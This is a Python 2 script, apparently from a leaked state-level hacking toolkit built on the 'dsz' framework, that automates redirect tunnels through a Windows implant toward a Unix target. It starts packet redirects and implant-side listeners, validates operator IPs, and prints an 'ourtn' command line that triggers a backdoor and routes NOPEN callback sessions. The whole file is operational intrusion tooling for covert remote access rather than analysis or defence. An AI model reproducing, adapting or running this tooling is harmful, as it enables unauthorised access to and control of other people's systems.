
import os, sys, re, random
from optparse import OptionParser
import dsz, dsz.lp, dsz.file

class unixredirect:

    def __init__(self, options):
        self.ishIP = options.ishIP
        self.noIP = options.noCallback
        self.unixTarget = options.unixTarget
        self.localWindows = ''
        self.localUnix = ''
        self.triggerType = options.triggerType
        self.triggerPort = options.triggerPort
        self.rawPort = '444'
        self.ishPort = options.ishPort
        self.noPort = options.noPort
        self.ids = []
        self.ipRegex = re.compile('^([0-9]{1,2}|[1][0-9]{0,2}|[2][0-5]{0,2})\\.([0-9]{1,2}|[1][0-9]{0,2}|[2][0-5]{0,2})\\.([0-9]{1,2}|[1][0-9]{0,2}|[2][0-5]{0,2})\\.([0-9]{1,2}|[1][0-9]{0,2}|[2][0-5]{0,2})$')

    def main(self):
        print 'Obtaining Local Windows IP Address'
        if (not self.getWindowsIP()):
            print 'Error getting local windows IP'
            return False
        print 'Obtaining Local Unix IP Address'
        self.getLinuxIP()
        answer = dsz.ui.Prompt(('Is this the correct local Windows IP: %s?' % self.localWindows), True)
        if (not answer):
            self.localWindows = dsz.ui.GetString('Enter local windows IP:', defaultValue=self.localWindows)
        answer = dsz.ui.Prompt(('Is this the correct local Unix IP: %s?' % self.localUnix), True)
        if (not answer):
            self.localUnix = dsz.ui.GetString('Enter local unix IP:', defaultValue=self.localUnix)
        print 'Validating IPs'
        for var in [self.localWindows, self.localUnix, self.ishIP, self.unixTarget]:
            if (not self.validateIP(var)):
                return False
        print 'Validating Ports'
        for var in [self.triggerPort, self.rawPort, self.ishPort, self.noPort]:
            if (not self.validatePort(var)):
                return False
        print 'Starting Windows Tunnels'
        print ''
        if (not self.startPacketRedirect()):
            return False
        if (not self.startDDRedirect()):
            return False
        if (not self.startNORedirect()):
            return False
        print 'Getting OURTN Line...'
        self.printOurtn()
        print 'All systems go'

    def validatePort(self, port):
        if ((int(port) < 1) or (int(port) > 65535)):
            print ('Port: %s is out of valid range' % port)
            return False
        else:
            return True

    def getWindowsIP(self):
        dsz.control.echo.Off()
        validWindows = False
        if dsz.cmd.Run('local ifconfig', dsz.RUN_FLAG_RECORD):
            [ipaddr] = dsz.cmd.data.Get('InterfaceItem[0]::IpAddress::ip', dsz.TYPE_STRING)
            size = dsz.cmd.data.Size('InterfaceItem')
            if ipaddr:
                for i in range(0, size):
                    ipaddr = ''
                    try:
                        [ipaddr] = dsz.cmd.data.Get(('InterfaceItem[%d]::IpAddress::ip' % i), dsz.TYPE_STRING)
                    except:
                        break
                    if (not re.match('192\\.168\\.254\\.\\d{1,3}|10\\.0\\.130\\.\\d{1,3}', ipaddr)):
                        print ('Invalid IP: %s' % ipaddr)
                        continue
                    else:
                        print 'VALID'
                        validWindows = True
                        break
                if validWindows:
                    print ('Local Windows IP: %s' % ipaddr)
                    self.localWindows = ipaddr.strip()
                    dsz.control.echo.On()
                    return True
                else:
                    return False
            else:
                print 'WHAT?'
                dsz.control.echo.On()
                return False
        else:
            dsz.control.echo.On()
            print 'Error running local ifconfig'
            return False

    def getLinuxIP(self):
        octets = self.localWindows.split('.')
        last = (int(octets.pop()) - 1)
        for oct in octets:
            self.localUnix += ('%s.' % oct)
        self.localUnix += ('%s' % last)
        return True

    def validateIP(self, ip):
        match = self.ipRegex.match(ip)
        if (not match):
            print ('Error validating IP: %s' % ip)
            return False
        else:
            return True

    def printOurtn(self):
        ourtn = ('ourtn -eY5 -U /current/up/noserver-X -W %s:%s' % (self.localWindows, self.rawPort))
        if ((self.triggerType == 'udp') and (self.triggerPort != self.ishPort)):
            ourtn += (' -y %s' % self.triggerPort)
        elif (self.triggerType == 'tcp'):
            ourtn += (' -s%s' % self.triggerPort)
        elif (self.triggerType == 'icmp'):
            ourtn += ' -sI'
        if (self.ishIP == '0.0.0.0'):
            source_ip = ''
            while (source_ip == ''):
                source_ip = dsz.ui.GetString('Enter source IP address:')
                if (not source_ip):
                    print 'Needs a source ip'
                else:
                    ourtn += (' -D %s' % source_ip)
            ourtn += (' -i 0.0.0.0 -p %s' % self.ishPort)
        else:
            ourtn += (' -i %s -p %s' % (self.ishIP, self.ishPort))
        if self.noIP:
            ourtn += (' -C %s -O %s' % (self.noIP, self.noPort))
        else:
            ourtn += (' -O %s' % self.noPort)
        ourtn += (' %s' % self.unixTarget)
        print ''
        print ourtn
        print ''

    def startPacketRedirect(self):
        dsz.control.echo.Off()
        cmd = ('monitor packetredirect -listenport %s' % self.rawPort)
        answer = dsz.ui.Prompt('Use -raw in packetredirect?', True)
        if answer:
            cmd = ('%s -raw' % cmd)
        else:
            answer = dsz.ui.Prompt('Specify Driver?', False)
            if answer:
                driver = dsz.ui.GetString('Enter driver name:', defaultValue='')
                if driver:
                    cmd = ('%s -driver %s' % (cmd, driver.strip()))
        print cmd
        if dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD):
            self.ids.append(str(dsz.cmd.LastId()))
            dsz.control.echo.On()
            return True
        else:
            dsz.control.echo.On()
            return False

    def startDDRedirect(self):
        dsz.control.echo.Off()
        cmd = ''
        if (self.ishIP == '0.0.0.0'):
            cmd = ('redirect -tcp -lplisten %s -target %s %s' % (self.ishPort, self.unixTarget, self.ishPort))
        else:
            cmd = ('redirect -tcp -implantlisten %s -target %s %s' % (self.ishPort, self.localUnix, self.ishPort))
        print cmd
        if dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD):
            self.ids.append(str(dsz.cmd.LastId()))
            dsz.control.echo.On()
            return True
        else:
            dsz.control.echo.On()
            self.stopRedirects()
            return False

    def startNORedirect(self):
        dsz.control.echo.Off()
        cmd = ''
        if self.noIP:
            cmd = ('redirect -tcp -implantlisten %s -target %s %s' % (self.noPort, self.localUnix, self.noPort))
        else:
            cmd = ('redirect -tcp -lplisten %s -target %s %s' % (self.noPort, self.unixTarget, self.noPort))
        print cmd
        if dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD):
            self.ids.append(str(dsz.cmd.LastId()))
            dsz.control.echo.On()
            return True
        else:
            self.stopRedirects()
            dsz.control.echo.On()
            return False

    def stopRedirects(self):
        dsz.control.echo.Off()
        localIds = self.ids
        for id in localIds:
            cmd = ('stop %s' % id)
            if dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD):
                print ('ID %s successfully stopped' % id)
                self.ids.remove(id)
            else:
                print ('Error stopping ID: %s' % id)
        dsz.control.echo.On()

def parseArgs():
    usage = 'unixredirect\n\t\n\t-y [ISH Trigger Type] (udp|tcp|icmp) Default: udp\n\t-i <ISH Callback IP>\n\t-p <ISH Callback/Listen Port>\n\t-r [ISH Trigger Port]\n\t-c [NOPEN Callback IP]\n\t-o [NOPEN Callback/Listen Port]\n\t-t <Unix Target IP>\n\t\n\tDefault EXAMPLE: unixredirect -i WINDOWS_CALLBACK -p 39145 -t UNIXTARGET\n\tISH/DD Listen:   unixredirect -i 0.0.0.0 -p 39145 -t UNIXTARGET\n'
    parser = OptionParser(usage=usage)
    parser.add_option('-y', dest='triggerType', type='string', action='store', default='udp')
    parser.add_option('-i', dest='ishIP', type='string', action='store', default=None)
    parser.add_option('-p', dest='ishPort', type='string', action='store', default=None)
    parser.add_option('-c', dest='noCallback', type='string', action='store', default=False)
    parser.add_option('-o', dest='noPort', type='string', action='store', default=str(random.randint(30000, 50000)))
    parser.add_option('-r', dest='triggerPort', type='string', action='store', default=None)
    parser.add_option('-t', dest='unixTarget', type='string', action='store', default=None)
    (options, args) = parser.parse_args(sys.argv)
    if ((not options.ishPort) or (not options.ishIP) or (not options.unixTarget)):
        print 'unixredirect requires at least the -i (ISH IP), -p (ISH Port), and the -t (UNIX Target)'
        return False
    if (not options.triggerPort):
        options.triggerPort = options.ishPort
    options.triggerType = options.triggerType.lower()
    if (not re.match('udp|tcp|icmp', options.triggerType)):
        print 'Invalid trigger type'
        return False
    return options
if (__name__ == '__main__'):
    options = parseArgs()
    if options:
        unixredirect(options).main()